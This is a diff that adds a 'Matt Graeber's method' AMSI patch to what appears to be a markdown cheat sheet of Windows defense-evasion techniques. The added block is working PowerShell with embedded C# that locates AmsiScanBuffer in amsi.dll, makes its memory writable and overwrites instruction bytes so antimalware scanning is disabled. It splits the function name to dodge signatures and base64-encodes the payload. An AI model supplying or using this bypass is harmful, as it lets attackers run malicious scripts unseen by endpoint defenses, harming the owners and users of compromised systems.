@@ -2340,6 +2340,51 @@ $Key = "4456625220575263174452554847";$Drawing = "Sy@ste£m.Ma£nag@eme@nt.Aut£
 
 ---
 	
+<br />
+
+### Amsi Patch - Matt Graeber's method<br />	
+	
+```powershell
+$AMSIBypass2=@"
+using System;
+using System.Runtime.InteropServices;
+namespace RandomNamespace
+{
+    public class RandomClass
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+        public static void RandomFunction()
+        {
+            IntPtr TargetDLL = LoadLibrary("amsi.dll");
+            IntPtr TotallyNotThatBufferYouRLookingForPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+         
+            VirtualProtect(TotallyNotThatBufferYouRLookingForPtr, dwSize, 0x40, out Zero);
+            Byte[] one = { 0x31 };
+            Byte[] two = { 0xff, 0x90 };
+            int length = one.Length + two.Length;
+            byte[] sum = new byte[length];
+            one.CopyTo(sum,0);
+            two.CopyTo(sum,one.Length);
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+             Marshal.Copy(sum, 0, unmanagedPointer, 3);
+             MoveMemory(TotallyNotThatBufferYouRLookingForPtr + 0x001b, unmanagedPointer, 3);
+        }
+    }
+}
+"@
+$AMSIBypass2encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass2))
+```
+	
+	
 <br />	
 
 ### @danielbohannon **escaping percent** signs bug (EventVwr.exe)
